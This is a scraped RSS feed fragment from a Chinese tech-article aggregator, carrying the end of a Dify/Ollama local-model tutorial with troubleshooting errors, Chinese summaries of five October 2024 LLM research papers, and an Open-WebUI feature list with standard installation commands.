🍵【生活小确幸】🌼 一杯香茗，一束鲜花，幸福感满满！💖8. 📸【记录美好】🌸 每天都是限量版，用心发现小确幸！✨9. 💖【生活美学】🌼 这样的小日常，幸福感瞬间up！🍵📖10. 🌿【小确幸日常】🌸 一本好书，一束鲜花，幸福感爆棚！✨11. 🌼【日常小秘诀】🍵 发现生活中的小美好，幸福感大增！💖12. 📖【限量版日常】🌸 每天都是独一无二的美好！📸✨13. ✨【生活小确幸】🌼 一杯香茗，一本好书，幸福感满满！🍵14. 🍵【日常美学】🌸 这样的小确幸，让你心情大好！💖15. 📸【小确幸分享】🌼 发现日常中的小美好，幸福感飙升！📖16. 💖【记录美好】🌸 每天都是限量版，用心发现小确幸！🌿✨17. 🌿【生活小美好】🌼 一本好书，一束鲜花，幸福感满满！🍵18. 🌼【日常小确幸】🍵 这样的小日常，幸福感瞬间up！📸💖19. 📖【小确幸日常】🌸 发现生活中的小美好，幸福感大增！✨20. ✨【限量版生活】🌼 每天都是独一无二的美好！🍵📖💖
文案：
🌿🌸【生活小确幸】🍵 每天都是限量版，用心发现生活中的小美好！📖 一杯香茗，🌼 一本好书，简单日常也能闪闪发光✨。分享我的生活小秘诀，幸福感瞬间up up！📸 记录每一刻，生活美学，从心开始💖。你也有这样的小确幸吗？快来评论区分享吧！🌟🌿#生活美学 #小确幸 #日常分享 #幸福感 #记录美好 #限量版生活14. 所遇问题C:\Users\xyb&gt;ollama serve
Error: listen tcp :11434: bind: An attempt was made to access a socketina way forbidden by its access permissions.C:\Users\xyb&gt;ollama run llama3.1:8b
Error: could not connect to ollama app, is it running?需要关闭本地环境中的代理。An error occurred during credentials validation: HTTPConnectionPool(host='127.0.0.1',port=11434): Max retries exceeded with url: /api/chat(Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7eff701373d0&gt;: Failed to establish a new connection: [Errno 111] Connection refused'))An error occurred during credentials validation: HTTPConnectionPool(host='localhost',port=11434): Max retries exceeded with url: /api/chat(Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7eff70136260&gt;: Failed to establish a new connection: [Errno 111] Connection refused'))填写Ollama模型名称和基础URL信息有误导致的。An error occurred during credentials validation: API request failed with status code404:{"error":"model\"Llama 3.1\"not found, try pulling it first"}15. 参考链接1️⃣https://mp.weixin.qq.com/s/jAX7uI_gjV4e7nzgb_rkrQ2️⃣https://github.com/langgenius/dify3️⃣Windows preview · Ollama Blog4️⃣llama3.1:8b5️⃣Download Ollama on Windows6️⃣ollama/ollama: Get up and running with Llama 3.1, Mistral, Gemma 2, and other large language models.Dify 教程二：使用本地大模型 | Coder 小站 (ihsxu.com)github.com/langgenius/dify)3️⃣Windows preview · Ollama Blog4️⃣llama3.1:8b5️⃣Download Ollama on Windows6️⃣ollama/ollama: Get up and running with Llama 3.1, Mistral, Gemma 2, and other large language models.http://www.ppmy.cn/news/1540382.html相关文章计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:22 +0000</pubDate>
    </item>
    <item>
      <title>计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13</title>
      <link>https://www.ppmy.cn/news/1540381.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13news/2025/10/31 17:53:21/计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录文章目录计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alignment by Rule Learning Improves World Model-based LLM Agents3. Agent S: An Open Agentic Framework that Uses Computers Like a Human4. Executing Arithmetic: Fine-Tuning Large Language Models as Turing Machines5. Towards Assurance of LLM Adversarial Robustness using Ontology-Driven Argumentation后记1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human BenchmarksAuthors: Isaac R. Galatzer-Levy, David Munday, Jed McGiffin, Xin Liu, DannyKarmon, Ilia Labzovsky, Rivka Moroshko, Amir Zait, Daniel McDuffhttps://arxiv.org/abs/2410.07391生成式人工智能的认知能力：与人类基准的比较分析摘要：本研究对领先的大型语言模型和视觉语言模型在韦氏成人智力量表（WAIS-IV）上的表现进行了基准测试，该量表是评估人类认知和智力能力的全面、基于人群标准化的评估工具。研究重点关注了言语理解（VCI）、工作记忆（WMI）和知觉推理（PRI）三个领域。大多数模型在存储、检索和操纵符号（如任意字母和数字序列）方面表现出色，工作记忆指数（WMI）的表现达到或超过人类99.5百分位。然而，多模态模型在知觉推理指数（PRI）上的表现普遍较差，显示出对视觉信息的解释和推理能力存在显著缺陷。研究背景：随着生成式人工智能（GenAI）的发展，人们越来越关注其在模仿人类认知功能方面的潜力。GenAI模型通过学习大量数据集中的潜在模式和结构，生成新颖的输出，这些输出常常模仿人类的创造力。然而，人类认知包括一系列专门能力，涉及信息的处理、存储、解释和生成，这些能力在听觉和视觉通道上都有所体现。算法模型：研究中使用了多种大型语言模型（LLMs）和视觉语言模型（VLMs），包括OpenAI的GPT-3.5 Turbo、Google的Gemini系列等。这些模型通过转换传统的语言和视觉刺激为基于文本的提示，并解释模型生成的文本输出作为测试项的响应。核心创新点：提出了一种新的方法，通过WAIS-IV对GenAI模型进行评估，以直接与人类能力进行比较。实现了一系列方法论适应，以适应这些模型独特的输入和输出方式。通过比较GenAI模型在不同认知领域的性能，揭示了它们在工作记忆和言语理解方面的相对优势，以及在知觉推理方面的显著弱点。实验效果：在言语理解指数（VCI）上，大多数模型表现在99.5百分位以上。在工作记忆指数（WMI）上，除了Gemini Nano外，大多数模型表现在99.5百分位以上。在知觉推理指数（PRI）上，所有多模态模型的表现都在极低水平，表明在视觉信息处理方面存在显著缺陷。后续潜在研究方向：探索如何通过架构改进或训练方法提升GenAI模型在知觉推理方面的能力。研究如何更好地模拟人类的多模态认知能力，包括视觉和听觉信息的处理。进一步研究GenAI模型在特定领域的应用，如艺术、设计、研究和通信等。推荐阅读指数：4.52. WALL-E: World Alignment by Rule Learning Improves World Model-based LLM AgentsAuthors: Siyu Zhou, Tianyi Zhou, Yijun Yang, Guodong Long, Deheng Ye, JingJiang, Chengqi Zhanghttps://arxiv.org/abs/2410.07484WALL-E：通过规则学习实现世界对齐，提升基于世界模型的LLM代理摘要：本研究提出了一种新的方法，通过规则学习来对齐大型语言模型（LLMs）与特定环境的动态，从而提高LLM代理在开放世界任务中的成功率和效率。研究者们开发了一个神经符号方法，通过LLMs的归纳推理和代码生成能力来学习规则，而无需梯度更新。这种方法通过比较代理探索的轨迹和世界模型预测来学习新规则或更新现有规则，从而提高预测和实际轨迹之间的一致性。研究背景：LLMs在复杂推理、生成和规划任务中表现出色，但在特定开放世界环境中作为代理部署时，其可靠性不足。主要原因是LLMs的常识推理与预训练知识与特定环境的动态之间存在差距，导致对未来状态的预测错误或违反基本规则。算法模型：研究者们提出了一个名为WALL-E的神经符号世界模型，该模型结合了预训练的LLM和从与环境的交互轨迹中学习到的一组新规则。这种方法结合了LLMs的丰富先验知识和规则的硬约束和严格保证。核心创新点：提出了一种无需梯度更新的神经符号方法，通过LLMs的归纳推理和代码生成能力来学习规则。通过比较代理探索的轨迹和世界模型预测来学习新规则或更新现有规则，从而提高预测和实际轨迹之间的一致性。通过模型预测控制（MPC）框架，优化了基于精确世界模型的LLM代理的探索和学习效率。实验效果：在Minecraft和ALFWorld环境中，WALL-E在成功率、重规划时间和推理所用的令牌数量上均优于现有方法。在Minecraft中，WALL-E的成功率比基线高出15-30%，同时重规划轮数减少8-20轮，令牌使用量为60-80%。在ALFWorld中，WALL-E在6次迭代后成功率达到95%，创下新高。后续潜在研究方向：探索如何将WALL-E方法应用于更广泛的环境和任务，以及如何进一步提高规则学习的效果和效率。研究如何结合更多的环境反馈和动态调整规则，以适应环境的快速变化。进一步研究如何减少规则学习过程中的人工干预，提高自动化程度。推荐阅读指数：43. Agent S: An Open Agentic Framework that Uses Computers Like a HumanAuthors: Saaket Agashe, Jiuzhou Han, Shuyu Gan, Jiachen Yang, Ang Li, Xin EricWanghttps://arxiv.org/abs/2410.08164代码： https://github.com/simular-ai/Agent-S.Agent S：一个像人类一样使用计算机的开放智能框架摘要：本文介绍了Agent S，这是一个能够通过图形用户界面（GUI）与计算机进行自主交互的开放智能框架，旨在通过自动化复杂、多步骤的任务来改变人机交互。Agent S 旨在解决在自动化计算机任务中面临的三个关键挑战：获取特定领域的知识、在长期任务规划中进行规划以及处理动态、不统一的界面。为此，Agent S 引入了经验增强的分层规划，通过外部知识搜索和内部经验检索在多个层面上进行学习，从而促进高效的任务规划和子任务执行。此外，它采用了一种特定的Agent-Computer Interface（ACI），以更好地激发基于多模态大型语言模型（MLLMs）的GUI代理的推理和控制能力。在OSWorld基准测试中的评估显示，Agent S 的成功率比基线高出9.37%（相对提高了83.6%），达到了新的最高水平。全面的分析突出了各个组成部分的有效性，并为未来的改进提供了见解。此外，Agent S 在新发布的WindowsAgentArena基准测试中展示了广泛的通用性，适用于不同的操作系统。代码可在GitHub上获得。研究背景：自从鼠标被发明以来，它一直由人类控制以与计算机进行交互。但是，这种交互是否必须如此？自主图形用户界面（GUI）代理提供了解决非常具体和高度多样化的用户查询的希望——例如，为个人用户进行数据输入、调度和文档创建，以及在商业环境中简化操作——以最通用的方式：通过直接UI交互使用鼠标和键盘。此外，通过消除对持续手动交互的需求，这些代理不仅提高了效率，还提高了可访问性，使残疾人能够以新的、变革性的方式与技术进行交互。最近在多模态大型语言模型（MLLMs）方面的进展，例如GPT-4o和Claude，为开发以人为中心的交互系统（如桌面操作系统）的GUI代理奠定了基础。算法模型：Agent S框架通过经验增强的分层规划、自我监督的持续记忆更新和精确的GUI感知和行动的Agent-Computer Interface（ACI），整合了三个主要策略来解决复杂的基于GUI的操作系统控制任务。这种分层规划方法利用在线Web知识和存储在叙事记忆中的过去经验，将复杂和长期的桌面任务分解成可管理的子任务。叙事记忆包含来自过去交互的高级、抽象的任务经验，为有效的任务规划提供了上下文理解。代理在每个子任务执行过程中监控任务完成进度，并检索详细的、逐步的子任务经验，以动态完善其行动并不断提高其规划能力。核心创新点：经验增强的分层规划：Agent S利用在线Web知识和存储在叙事记忆中的过去经验，将复杂和长期的桌面任务分解成可管理的子任务。叙事记忆和情景记忆：叙事记忆包含成功和失败轨迹的摘要，而情景记忆包含完整的计划，具有特定的基础行动。Agent-Computer Interface（ACI）：ACI定义了一种交互范式，使用视觉输入和图像增强的可访问性树进行精确的元素定位，并使用语言基础的原语来生成环境转换。实验效果：在OSWorld基准测试中，Agent S在成功率上比基线模型高出9.37%，相对提高了83.6%，达到了新的最高水平。在WindowsAgentArena基准测试中，Agent S在没有任何明确适应的情况下，性能从13.3%提高到18.2%，展示了对不同操作系统的广泛通用性。后续潜在研究方向：考虑任务完成所需的代理步骤和墙钟时间，未来的工作可以考虑GUI控制的最短路径导航公式，并在时间和准确性的维度上评估各种代理的帕累托最优性。将经验增强和Agent Computer Interface的思想扩展到更小的、开源的MLLMs，这些MLLMs可以被微调以弥补差距。推荐阅读指数：44. Executing Arithmetic: Fine-Tuning Large Language Models as Turing MachinesAuthors: Junyu Lai, Jiahe Xu, Yao Yang, Yunpeng Huang, Chun Cao, Jingwei Xuhttps://arxiv.org/abs/2410.07896执行算术：将大型语言模型微调为图灵机摘要：本文提出了一个可组合的算术执行框架（CAEF），使大型语言模型（LLMs）能够通过模拟图灵机来学习逐步执行计算，从而真正理解计算逻辑。此外，该框架具有高度的可扩展性，允许通过组合学习到的运算符来显著降低学习复杂运算符的难度。在评估中，CAEF在七个常见的数学运算上实现了近100%的准确率，有效地支持了涉及多达100位操作数的计算，这是GPT-4o在某些设置中明显不足的。研究背景：尽管LLMs在自然语言处理和推理任务中表现出色，但在算术领域的性能仍然不尽人意。LLMs在处理算术任务时，往往通过记忆特定的例子而不是学习底层的计算逻辑，限制了它们对新问题的泛化能力。算法模型：CAEF框架包括执行器（executor）和对齐器（aligner）两个独立组件。执行器负责执行实际的计算，通过模拟相应算术图灵机的转移函数来学习底层的计算逻辑。对齐器作为接口，将原始算术表达式（例如89×2=）转换为执行器可以直接处理的格式。执行器完成后，对齐器将执行器的输出转换回最终结果。核心创新点：提出了一个三步流程，每个算术运算符都由执行器和对齐器支持。设计了一个执行器作曲器，负责复杂运算符的高级执行程序，并允许函数调用来调用其他预学习的算术运算符。实现了七个运算符：+、−、×、÷、&gt;、&lt;和==，以及两个辅助运算符。实验效果：CAEF在所有七个运算符上都实现了高准确率，即使在操作数长达100位的情况下。与GPT-4o相比，配备CAEF的LLM在操作数长度变化时的影响最小，有效支持了长达100位的操作数计算。后续潜在研究方向：探索如何将CAEF框架应用于更复杂的数学问题和计算任务。研究如何进一步优化执行器和对齐器的性能，以提高计算效率。考虑如何将CAEF框架与其他类型的计算模型和算法相结合，以扩展其应用范围。推荐阅读指数：4.55. Towards Assurance of LLM Adversarial Robustness using Ontology-Driven ArgumentationAuthors: Tomas Bueno Momcilovic, Beat Buesser, Giulio Zizzo, Mark Purcell,Tomas Bueno Momcilovichttps://arxiv.org/abs/2410.07962使用本体驱动论证确保LLM对抗性鲁棒性摘要：尽管大型语言模型（LLMs）在各种自然和领域特定语言任务中显示出了适应性，但在确保它们的安全性、透明度和可解释性方面仍存在挑战。鉴于LLMs对对抗性攻击的敏感性，需要通过不断演变的对抗性训练和防护措施来防御LLMs。然而，管理隐含和异构知识以持续确保鲁棒性是困难的。我们引入了一种新的方法，基于形式化论证来确保LLMs的对抗性鲁棒性。使用本体论进行形式化，我们结构化了最先进的攻击和防御，促进了人类可读的保证案例的创建，以及机器可读的表示。我们通过英语语言和代码翻译任务中的示例展示了其应用，并针对工程师、数据科学家、用户和审计员提供了理论和实践上的影响。研究背景：LLMs在自然和编程语言任务中展现出了预测、翻译和生成文本的能力。然而，它们对对抗性攻击的脆弱性，如通过恶意提示绕过防护措施或模型对齐以获得有害输出，使得它们的安全性和鲁棒性成为研究的重点。算法模型：文章提出了一种基于本体论驱动论证的方法，通过形式化攻击和防御的关系，以及变量（如攻击成功率、字符类型）的值，来构建人类可读的保证案例和机器可读的语义网络。核心创新点：提出了一种新的方法，使用本体论来形式化LLMs的攻击和防御知识，并构建保证案例。通过本体论模型，允许基于人类可读的保证案例进行形式化论证，从而创建共享的关于训练、防护措施和实施的理解。展示了如何在自然语言任务和代码翻译任务中应用这种方法，以及如何通过查询中心仓库中的参数值来进行持续推理。实验效果：文章没有提供具体的实验数据，但通过示例展示了该方法在不同任务中的应用潜力。后续潜在研究方向：探索如何将这种方法应用于更广泛的LLM应用领域和任务。研究如何进一步优化本体论模型和保证案例的结构，以提高其可扩展性和自动化程度。考虑如何将这种方法与其他类型的AI技术和方法相结合，以提高整体系统的安全性和鲁棒性。推荐阅读指数：3.5后记如果您对我的博客内容感兴趣，欢迎三连击(点赞、收藏、关注和评论)，我将持续为您带来计算机人工智能前沿技术(尤其是AI相关的大语言模型，深度学习和计算机视觉相关方向)最新学术论文及工程实践方面的内容分享，助力您更快更准更系统地了解AI前沿技术。http://www.ppmy.cn/news/1540381.html相关文章Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
2024年即将到来&amp;#xff0c;作为一名大学生&amp;#xff0c;为了表达在新的一年里&amp;#xff0c;对祖国的祝福&amp;#xff0c;请编写程序输出祝福语&amp;#xff1a;在新的一年…阅读更多...【Linux】进程ID和线程ID在日志中的体现在分析内核打印日志流程的时候&amp;#xff0c;发现有时候同一个进程函数调用关系比较混乱&amp;#xff08;因为只打印了进程号&amp;#xff09;&amp;#xff0c;现象就是一个函数走着走着不知道走哪里去了。  
另一个现象是&amp;#xff0c;在Linux启动Firefox的时候&amp;#xff0c;启了大概80个进程&amp;…阅读更多...android11 usb摄像头添加多分辨率支持部分借鉴于&amp;#xff1a;https://blog.csdn.net/weixin_45639314/article/details/142210634 
目录 
一、需求介绍 
二、UVC介绍 
三、解析 
四、补丁修改 
1、预览的限制主要存在于hal层和framework层 
2、添加所需要的分辨率&amp;#xff1a; 
3、hal层修改 
4、frameworks 
5、备…阅读更多...视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:21 +0000</pubDate>
    </item>
    <item>
      <title>Open-WebUI</title>
      <link>https://www.ppmy.cn/news/1540380.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Open-WebUInews/2025/10/31 17:53:20/Open-WebUI特点⭐️直观的界面：聊天界面从 ChatGPT 中汲取灵感，确保用户友好的体验。响应式设计：在桌面和移动设备上享受无缝体验。⚡快速响应：享受快速响应的性能。轻松设置：使用 Docker 或 Kubernetes（kubectl、kustomize 或 helm）无缝安装，以获得无忧体验。代码语法突出显示：通过我们的语法突出显示功能增强代码的可读性。✒️完整的 Markdown 和 LaTeX 支持：通过全面的 Markdown 和 LaTeX 功能来丰富交互，提升您的 LLM 体验。本地 RAG 集成：通过突破性的检索增强生成 (RAG) 支持深入了解聊天交互的未来。此功能将文档交互无缝集成到您的聊天体验中。您可以将文档直接加载到聊天中或将文件添加到文档库中，使用#提示中的命令轻松访问它们。在 alpha 阶段，当我们积极完善和增强此功能以确保最佳性能和可靠性时，可能会偶尔出现问题。网页浏览功能#：使用URL 后的命令将网站无缝集成到您的聊天体验中。此功能允许您将网络内容直接合并到您的对话中，从而增强交互的丰富性和深度。提示预设支持/：使用聊天输入中的命令立即访问预设提示。轻松加载预定义的对话开头并加快您的互动。通过Open WebUI Community集成轻松导入提示。RLHF 注释：通过对消息进行“赞成”和“反对”评级来增强您的消息的能力，从而促进根据人类反馈 (RLHF) 创建强化学习数据集。利用您的消息来训练或微调模型，同时确保本地保存数据的机密性。️对话标记：轻松分类和定位特定聊天，以便快速参考和简化数据收集。️下载/删除模型：直接从 Web UI 轻松下载或删除模型。⬆️GGUF 文件模型创建：通过直接从 Web UI 上传 GGUF 文件，轻松创建 Ollama 模型。简化的流程，可选择从您的计算机上传或从 Hugging Face 下载 GGUF 文件。多模型支持：不同聊天模型之间无缝切换，实现多样化交互。多模态支持：与支持多模态交互的模型无缝交互，包括图像（例如 LLava）。模型文件生成器：通过 Web UI 轻松创建 Ollama 模型文件。通过开放 WebUI 社区集成轻松创建和添加角色/代理、自定义聊天元素以及导入模型文件。⚙️多个模特对话：轻松地同时与多个模特互动，利用他们的独特优势来获得最佳响应。通过并行利用一组不同的模型来增强您的体验。协作聊天：通过无缝编排群组对话来利用多个模型的集体智慧。使用@命令指定模型，在聊天界面中启用动态且多样化的对话。让自己沉浸在聊天环境中的集体智慧中。再生历史记录访​​问：轻松重新访问和探索您的整个再生历史记录。聊天历史记录：轻松访问和管理您的对话历史记录。导入/导出聊天历史记录：将您的聊天数据无缝移入和移出平台。️语音输入支持：通过语音交互与您的模型互动；享受直接与模特交谈的便利。此外，探索在 3 秒静音后自动发送语音输入的选项，以获得简化的体验。⚙️使用高级参数进行微调控制：通过调整温度等参数和定义系统提示来获得更深层次的控制，以根据您的特定偏好和需求定制对话。图像生成集成：使用 AUTOMATIC1111 API（本地）和 DALL-E 无缝集成图像生成功能，通过动态视觉内容丰富您的聊天体验。OpenAI API 集成：轻松集成 OpenAI 兼容 API，与 Ollama 模型进行多功能对话。自定义 API 基本 URL 以链接到LMStudio、Mistral、OpenRouter 等。✨多种 OpenAI 兼容 API 支持：无缝集成和定制各种 OpenAI 兼容 API，增强聊天交互的多功能性。外部 Ollama 服务器连接：通过配置环境变量无缝链接到托管在不同地址上的外部 Ollama 服务器。多个 Ollama 实例负载平衡：轻松地在多个 Ollama 实例之间分配聊天请求，以增强性能和可靠性。多用户管理：通过我们直观的管理面板轻松监督和管理用户，简化用户管理流程。基于角色的访问控制（RBAC）：通过受限的权限确保安全访问；只有经过授权的个人才能访问您的 Ollama，并且为管理员保留专有的模型创建/拉取权限。后端反向代理支持：通过 Open WebUI 后端和 Ollama 之间的直接通信增强安全性。这一关键功能消除了通过 LAN 公开 Ollama 的需要。从 Web UI 向“/ollama/api”路由发出的请求会从后端无缝重定向到 Ollama，从而增强整体系统安全性。多语言支持：借助我们的国际化 (i18n) 支持，以您喜欢的语言体验开放式 WebUI。加入我们，扩展我们支持的语言！我们正在积极寻找贡献者！持续更新：我们致力于通过定期更新和新功能来改进 Open WebUI。🚀 Getting Started | Open WebUIFor Linux/macOS:git clone https://github.com/open-webui/open-webui.git
cd open-webui/# Copying required .env file
cp -RPp .env.example .env# Building Frontend Using Node
npm install
npm run buildcd ./backend# Optional: To install using Conda as your development environment, follow these instructions:
# Create and activate a Conda environment
conda create --name open-webui-env python=3.11
conda activate open-webui-env# Install dependencies
#pip install -r requirements.txt -U
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt -U# Start the application
bash start.shFor Windows:git clone https://github.com/open-webui/open-webui.git
cd open-webuicopy .env.example .envnpm install
npm run buildcd .\backend# Optional: To install using Conda as your development environment, follow these instructions:
# Create and activate a Conda environment
conda create --name open-webui-env python=3.11
conda activate open-webui-env#pip install -r requirements.txt -U
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt -Ustart.bathttp://www.ppmy.cn/news/1540380.html相关文章ToB项目身份认证AD集成（完）：利用ldap.js实现与windows AD对接实现用户搜索、认证、密码修改等功能 - 以及针对中文转义问题的补丁方法介绍在前面的两篇文章中，我详细的介绍了使用ldap与window AD服务集成，实现ToB项目中的身份认证集成方案，包括技术方案介绍、环境配置： ToB项目身份认证AD集成（一）：基于目录的用户管理、LDAP和Active Directory简述 ToB项目身份认证AD集成（二）：一分钟搞定window server 20…阅读更多...理解C#中空值条件运算符及空值检查简化前言 .NET 4.6 及以上版本，提供了空值条件运算符 ?. 和 ?[]。这些运算符的引入，为我们提供了一种简明的方式来处理空值的场景、简化空值检查，可避免 NullReferenceExceptions 的异常。本文将探索 C# 的空值检查运算符。 
介绍 空值，这里指的是 null。在定义对象后，未对其…阅读更多...深入了解Vue Router：基本用法、重定向、动态路由与路由守卫的性能优化文章目录 1. 引言2. Vue Router的基本用法2.1 基本配置 3. 重定向和命名路由的使用3.1 重定向3.2 命名路由 4. 在Vue Router中如何处理动态路由4.1 动态路由的概念4.2 如何处理动态路由4.3 动态路由的懒加载 5. 路由守卫的实现与性能影响5.1 什么是路由守卫&amp;#xff1f;5.2 路由…阅读更多...2024入门测参考答案（c语言版）先自己看代码思考&amp;#xff0c;不理解的地方可以截图私聊…… 
7-1 祝福祖国&amp;#xff01; 
这是一个编程题模板。 
